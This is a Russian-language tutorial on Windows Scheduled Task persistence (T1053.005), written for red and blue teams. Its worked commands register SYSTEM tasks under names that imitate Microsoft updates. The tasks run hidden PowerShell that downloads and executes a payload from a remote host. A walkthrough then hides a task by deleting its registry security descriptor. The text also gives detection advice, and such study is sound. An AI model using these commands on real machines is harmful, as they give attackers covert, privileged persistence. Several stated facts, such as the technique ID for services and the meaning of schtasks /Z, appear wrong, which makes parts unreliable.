# Закрепление на Windows-хосте: Механизмы и детекция Scheduled Tasks (T1053.005)

## Контекст и базовые понятия

Scheduled Tasks (Запланированные задачи) в операционных системах семейства Windows представляют собой механизм планировщика задач (Task Scheduler), позволяющий запускать программы, скрипты или сценарии по расписанию или при наступлении определенных событий. В контексте информационной безопасности и тестирования на проникновение (Red Teaming) этот механизм классифицируется как техника закрепления (Persistence) и выполнения кода (Execution). Согласно базе знаний MITRE ATT&CK, техника имеет идентификатор **T1053.005** (подтехника T1053 Scheduled Task/Job).

Основная ценность Scheduled Tasks для атакующих заключается в их способности обеспечивать постоянный доступ к системе без необходимости взаимодействия с пользователем. В отличие от простых ключей реестра (Run Keys), которые часто мониторятся антивирусами, запланированные задачи интегрированы в ядро ОС и используются легитимными процессами для обслуживания системы, обновлений и резервного копирования. Это создает высокий уровень доверия и маскировки.

Ключевое разграничение необходимо проводить между самой техникой (T1053) и ее подтехниками, а также между различными способами создания задач. Техника T1053 охватывает кросс-платформенное планирование, тогда как T1053.005 специфична для Windows. Важно отличать Scheduled Tasks от других механизмов автоматизации, таких как службы Windows (Services) или скрипты автозагрузки (Startup Folder), так как они имеют разные точки хранения, уровни привилегий и индикаторы компрометации (IoC).

| Характеристика | Scheduled Tasks (T1053.005) | Windows Services (T1053.001) | Startup Folder / Run Keys |
| :--- | :--- | :--- | :--- |
| **Уровень привилегий** | Любой (User, SYSTEM, Admin) | SYSTEM, Local Service, Network Service | Уровень текущего пользователя |
| **Триггеры запуска** | Время, Logon, Idle, Event, Boot | Запуск службы ОС, зависимость от другой службы | Вход пользователя, загрузка ОС |
| **Хранение конфигурации** | XML в `C:\Windows\System32\Tasks\` | Реестр (`HKLM\SYSTEM\CurrentControlSet\Services`) | Реестр или файловая система |
| **Сложность детекции** | Средняя (зависит от маскировки) | Низкая (стандартные ключи реестра) | Низкая (легко просматривается) |
| **Основное назначение** | Периодические задачи, фоновая работа | Долгоживущие фоновые процессы | Быстрый запуск приложений |

С точки зрения архитектуры, запланированная задача состоит из трех основных компонентов: **Trigger** (триггер, определяющий *когда* запускать), **Action** (действие, определяющее *что* запускать) и **Principal** (принципал, определяющий *от чьего имени* запускать). Атакующие часто манипулируют полем Principal, чтобы запустить вредоносный код от имени `NT AUTHORITY\SYSTEM`, что эквивалентно повышению привилегий до уровня ядра системы.

Существует путаница между использованием утилиты командной строки `schtasks.exe` и графического интерфейса (GUI). Хотя GUI удобен для администраторов, в сценариях пост-эксплуатации чаще используется `schtasks.exe` или PowerShell (через WMI/CIM), так как они позволяют автоматизировать процесс и работать в безголовых (headless) средах. Кроме того, существует различие между созданием задачи через `schtasks` и через COM-объекты (например, `IExecAction`), что влияет на то, какие события регистрации (Event Logs) будут зафиксированы.

## Внутреннее устройство Scheduled Tasks

Scheduled Tasks в современных версиях Windows (Vista и новее) хранятся в формате XML. Файлы задач находятся в директории `C:\Windows\System32\Tasks\` (для системных задач) или `C:\Windows\SysWOW64\Tasks\` (для 32-битных задач на 64-битных системах). Структура XML-файла строго регламентирована и содержит несколько ключевых секций, определяющих поведение задачи.

### Структура XML-конфигурации

Каждая задача представляет собой объект, который можно описать следующей схемой полей. Понимание этой структуры критически важно для анализа инцидентов, так как вредоносные задачи часто маскируются под легитимные, изменяя только поля `Command` или `Arguments`.

```xml
<Task version="1.4">
  <RegistrationInfo>
    <Description>Иллюстративная схема описания задачи</Description>
    <Author>NT AUTHORITY\SYSTEM</Author> <!-- Кто создал -->
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <UserId>S-1-5-21-... (SID пользователя)</UserId>
      <Delay>PT0S</Delay>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId> <!-- SYSTEM -->
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstances>IgnoreNew</MultipleInstances>
    <StartWhenAvailable>true</StartWhenAvailable>
    <Hidden>false</Hidden> <!-- Важно: может быть true для маскировки -->
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Command>
      <Arguments>-WindowStyle hidden -ep bypass -nop -c "IEX ..."</Arguments>
      <WorkingDirectory>C:\Windows\System32\</WorkingDirectory>
    </Exec>
  </Actions>
</Task>
```

*   **Triggers**: Определяет события. Поддерживаемые типы: `BootTrigger`, `LogonTrigger`, `SessionStateChangeTrigger` (idle/logoff), `RegistrationTrigger`, `TimeTrigger` (расписание).
*   **Principals**: Определяет контекст безопасности. `UserId` может быть SID или именем. `LogonType` определяет, как задача получает доступ к сети и файлам (например, `InteractiveToken` требует входа пользователя, `ServiceAccount` — нет).
*   **Actions**: Содержит исполняемый файл (`Command`) и его аргументы (`Arguments`). Именно здесь часто скрывается полезная нагрузка (payload).

### Механизмы скрытия (Hide Artifacts)

Одной из самых опасных особенностей Scheduled Tasks является возможность скрытия задач от стандартных средств просмотра. По умолчанию задачи видны в `schtasks /query` и в GUI Task Scheduler. Однако атакующие могут удалить или изменить дескриптор безопасности (Security Descriptor, SD) задачи.

В реестре Windows (в разделе `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree`) каждая задача имеет ключ с именем, соответствующим пути задачи. Внутри этого ключа есть значение `SD` (Security Descriptor). Если удалить это значение, задача перестает отображаться в стандартных запросах, так как система не может прочитать ее права доступа. Для удаления требуется привилегия `SYSTEM`.

| Метод скрытия | Механизм | Требует привилегий | Индикатор компрометации (IoC) |
| :--- | :--- | :--- | :--- |
| **Удаление SD** | Удаление значения `SD` в реестре задачи | SYSTEM | Отсутствие ключа `SD` в `TaskCache\Tree\...` |
| **Изменение Index** | Изменение метаданных `Index` в реестре | SYSTEM | Несоответствие `Index` между `TaskCache\Tree` и `TaskCache\Tasks` |
| **Скрытый XML** | Установка флага `<Hidden>true</Hidden>` | Пользователь/Admin | Флаг `Hidden` в XML задачи |
| **Маскировка имени** | Использование имени легитимной задачи | Пользователь/Admin | Анализ содержимого `Actions` (command/args) |

### Взаимодействие с COM и WMI

Помимо `schtasks.exe`, задачи можно создавать через Windows Management Instrumentation (WMI) и COM-интерфейсы. PowerShell cmdlet `New-ScheduledTaskTrigger` и `Register-ScheduledTask` используют WMI класс `PS_ScheduledTask`. Это важно, потому что создание через WMI может генерировать события регистрации (Event ID 106, 100, 102 в журнале `Microsoft-Windows-TaskScheduler/Operational`), которые отличаются от событий, генерируемых при использовании `schtasks.exe` (Event ID 100, 102, 106, но с разными деталями в XML события).

Атакующие также могут использовать технику **COM Hijacking** через Scheduled Tasks. Если задача настроена на запуск DLL через `DllHost.exe` (COM Surrogate), вредоносная DLL загружается в процесс-контейнер, что усложняет форензику, так как полезная нагрузка не выполняется напрямую в `svchost.exe` или `explorer.exe`.

## Применение и работа с предметом

На практике работа с Scheduled Tasks в контексте пост-эксплуатации включает создание, модификацию, выполнение и очистку задач. Для специалистов по красным командам (Red Team) важно использовать методы, которые минимизируют шум в логах и избегают триггеров EDR. Для специалистов по синим командам (Blue Team) и аналитиков SOC ключевым является анализ аномалий в конфигурации задач.

### Создание задач через schtasks.exe

Утилита `schtasks.exe` является стандартным инструментом. Она поддерживает множество параметров, но для закрепления наиболее важны `/tn` (имя задачи), `/tr` (путь к исполняемому файлу), `/sc` (тип расписания) и `/ru` (пользователь).

Типичный сценарий создания задачи для запуска PowerShell-скрипта при входе пользователя:

```powershell
schtasks /create /tn "WindowsUpdateHelper" /tr "powershell.exe -WindowStyle hidden -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/payload''))'" /sc onlogon /ru SYSTEM
```

*   `/tn`: Имя задачи. Атакующие часто используют имена, похожие на легитимные (например, `MicrosoftUpdate`, `SysCheck`).
*   `/tr`: Команда запуска. Использование `powershell.exe` с аргументами `-WindowStyle hidden` и `-ep bypass` является стандартным паттерном для обхода политик выполнения и скрытия окна.
*   `/sc onlogon`: Запуск при входе любого пользователя.
*   `/ru SYSTEM`: Запуск от имени SYSTEM. Это критически важно для повышения привилегий.

### Программное создание через PowerShell (WMI/CIM)

Использование PowerShell позволяет создавать более сложные задачи и избегать прямого вызова `schtasks.exe`, что может обойти некоторые правила детекции, основанные на имени процесса.

```powershell
$trigger = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType S4U -RunLevel Highest
$action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c start /min powershell.exe -nop -w hidden -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/payload''))'"
Register-ScheduledTask -TaskName "SystemHealthCheck" -Trigger $trigger -Principal $principal -Action $action
```

Здесь используется `-LogonType S4U` (Service for User), что позволяет задаче работать без интерактивного входа пользователя, но с привилегиями SYSTEM.

### Скрытые задачи и обход детекции

Как упоминалось выше, удаление дескриптора безопасности (SD) делает задачу невидимой для `schtasks /query`. Однако задача продолжает выполняться. Для обнаружения таких задач необходимо напрямую обращаться к реестру или использовать специализированные инструменты (например, `AccessChk` от Sysinternals или скрипты на Python, читающие реестр).

```powershell
# Проверка наличия ключа SD в реестре для конкретной задачи
$path = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\YourTaskName"
Get-ItemProperty -Path $path -Name SD -ErrorAction SilentlyContinue
```

Если команда возвращает ошибку "Не удалось найти свойство", значит, дескриптор удален, и задача скрыта.

### Типичные ошибки и подводные камни

1.  **Неверный путь к PowerShell**: Использование `powershell.exe` из `System32` на 64-битной системе может привести к запуску 64-битной версии, которая может несовместима с 32-битными библиотеками, если payload написан для 32-битной среды. В таких случаях используют `syswow64\powershell.exe`.
2.  **Кавычки в аргументах**: При использовании `schtasks.exe` вложенные кавычки в аргументах PowerShell требуют экранирования. Ошибка в экранировании приводит к тому, что задача не запускается или запускает неверную команду.
3.  **Зависимость от сети**: Если задача настроена на загрузку payload из сети, а сеть недоступна при триггере, задача будет проигнорирована или завершится с ошибкой. Использование параметра `/Z` (запуск, когда компьютер включен) или `/F` (перезапись существующей задачи) помогает избежать интерактивных запросов.

## Сквозной практический пример: Закрепление и скрытие задачи

**Исходные условия:**
*   **Среда:** Windows 10/11 (или Windows Server 2016+).
*   **Роль:** Pentester, имеющий доступ к командной строке с правами локального администратора.
*   **Цель:** Создать скрытую запланированную задачу, которая будет перезагружать полезную нагрузку (payload) каждые 30 минут от имени SYSTEM, и затем попытаться обнаружить ее стандартными средствами.
*   **Инструменты:** `schtasks.exe`, PowerShell, Regedit.

### Шаг 1: Создание легитимно выглядящей задачи

Создадим задачу с именем, имитирующим системное обновление, и триггером по времени.

```powershell
schtasks /create /tn "MicrosoftUpdateService" /tr "cmd.exe /c start /min powershell.exe -WindowStyle hidden -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/payload''))'" /sc minute /mo 30 /ru SYSTEM /f
```

*   **Действие:** Запуск `schtasks` с параметром `/create`.
*   **Артефакт:** Команда выше.
*   **Ожидаемый вывод:** `Успешно завершено` (Success). Задача создана и видна в планировщике.

### Шаг 2: Проверка видимости задачи

Проверим, как задача отображается в стандартном списке.

```powershell
schtasks /query /tn "MicrosoftUpdateService" /fo LIST
```

*   **Действие:** Запрос информации о задаче.
*   **Артефакт:** Вывод команды.
*   **Ожидаемый вывод:** Отображение имени задачи, триггера, пользователя (SYSTEM) и команды запуска. Задача видна.

### Шаг 3: Скрытие задачи через удаление SD

Для скрытия задачи от `schtasks /query` удалим дескриптор безопасности из реестра.

```powershell
# Получаем путь к задаче в реестре
$taskPath = "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\MicrosoftUpdateService"
# Удаляем значение SD
Remove-ItemProperty -Path "HKLM:\$taskPath" -Name "SD" -Force
```

*   **Действие:** Удаление ключа `SD` из реестра.
*   **Артефакт:** PowerShell-команда выше.
*   **Ожидаемый вывод:** Ошибки нет (значит, ключ удален).

### Шаг 4: Проверка невидимости

Повторно запросим задачу через `schtasks`.

```powershell
schtasks /query /tn "MicrosoftUpdateService" /fo LIST
```

*   **Действие:** Повторный запрос.
*   **Артефакт:** Вывод команды.
*   **Ожидаемый вывод:** `Ошибка: Задача не найдена` (Error: Task not found). Задача больше не отображается в стандартном списке, но продолжает выполняться по расписанию.

### Шаг 5: Обнаружение скрытой задачи

Для обнаружения используем прямой запрос к реестру или инструмент `AccessChk`.

```powershell
# Проверка наличия ключа SD
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\MicrosoftUpdateService" -Name SD -ErrorAction SilentlyContinue
```

*   **Действие:** Чтение реестра.
*   **Артефакт:** Вывод команды.
*   **Ожидаемый вывод:** Если вывод пуст или ошибка "Свойство не найдено", задача скрыта. Для полного анализа нужно экспортировать XML задачи: `schtasks /query /tn "MicrosoftUpdateService" /xml` (может не работать для скрытых задач, поэтому лучше читать XML из `TaskCache\Tasks\{GUID}`).

**Ожидаемый вывод примера:**
Пример демонстрирует, как стандартные средства мониторинга (`schtasks /query`) могут быть обойдены. Атакующий получает устойчивое закрепление (Persistence) и повышение привилегий (Privilege Escalation) до SYSTEM. Для защиты необходимо мониторить не только создание задач, но и изменения в реестре `TaskCache`, а также аномальные вызовы `powershell.exe` с аргументами `-WindowStyle hidden` и `-ep bypass`.

## Аналитический вывод

Техника T1053.005 (Scheduled Tasks) остается одним из наиболее эффективных механизмов закрепления на Windows-хостах благодаря своей интеграции в ОС и широкому использованию легитимными процессами. Ключевая уязвимость заключается в том, что планировщик задач не различает легитимные и вредоносные задачи по умолчанию, полагаясь на контекст выполнения и права доступа.

Для специалистов по красным командам важно понимать, что простое создание задачи через `schtasks.exe` легко обнаруживается. Продвинутые техники включают скрытие задач через удаление дескрипторов безопасности (SD) в реестре, использование COM-объектов для обхода логов регистрации и маскировку под системные процессы. Для синих команд и аналитиков SOC критически важно мониторить не только события создания задач (Event ID 100, 102), но и аномалии в конфигурации: появление задач с триггерами `OnIdle` или `OnLogon` от имени SYSTEM, использование PowerShell с флагами обхода политик, а также отсутствие дескрипторов безопасности у существующих задач.

Эффективная защита требует комплексного подхода: внедрение правил детекции (Sigma/YARA) для анализа аргументов задач, мониторинг изменений в реестре `TaskCache`, использование EDR-решений, блокирующих неавторизованные вызовы `schtasks.exe` и PowerShell, а также регулярный аудит запланированных задач с помощью скриптов, проверяющих целостность дескрипторов безопасности.

## Источники

1.  [MITRE ATT&CK: Scheduled Task/Job: Scheduled Task (T1053.005)](https://attack.mitre.org/techniques/T1053/005/)
2.  [Penetration Testing Lab: Persistence – Scheduled Tasks](https://pentestlab.blog/2019/11/04/persistence-scheduled-tasks/)
3.  [Red Canary Threat Detection Report: Scheduled Task](https://redcanary.com/threat-detection-report/techniques/scheduled-task/)
4.  [Picus Security: Scheduled Task/Job - The Most Used MITRE ATT&CK Persistence Technique](https://www.picussecurity.com/resource/scheduled-task/job-the-most-used-mitre-attck-persistence-technique)
5.  [Cofense: Windows Persistence Explained: Techniques, Risks, and What Defenders Should Know](https://cofense.com/blog/windows-persistence-explained-techniques,-risks,-and-what-defenders-should-know)
6.  [Detection.FYI: Scheduled Task Executing Payload from Registry (Sigma Rule)](https://detection.fyi/sigmahq/sigma/windows/process_creation/proc_creation_win_schtasks_reg_loader/)
7.  [Splunk Security Content: Analytics Story: Windows Persistence Techniques](https://research.splunk.com/stories/windows_persistence_techniques/)
8.  [SpartansSec: Windows Persistence Through Scheduled Tasks: A Red Team Perspective](https://www.spartanssec.com/post/windows-persistence-through-scheduled-tasks-a-red-team-perspective)
9.  [stmxcsr: Persistence 101: Looking at the Scheduled Tasks](https://stmxcsr.com/persistence/scheduled-tasks.html)
10. [Security Scientist: 12 Questions and Answers About Scheduled Task (T1053.005)](https://www.securityscientist.net/blog/scheduled-task-t1053-005/)